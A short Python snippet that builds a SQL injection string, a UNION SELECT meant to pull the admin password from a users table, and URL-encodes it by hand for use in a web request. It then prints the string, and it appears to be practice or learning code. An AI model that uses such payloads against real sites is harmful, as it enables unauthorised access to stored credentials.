import requests
import re


basic_sql ="' UNION SELECT password FROM users WHERE username=admin--"


#basic use of URL_parsing
new_sql = basic_sql.replace(" ", "+")
new_sql = new_sql.replace("=","%3D")
new_sql = new_sql.replace("'","%27")
new_sql = new_sql.replace("(","%28")
new_sql = new_sql.replace(")","%29")


print(new_sql)
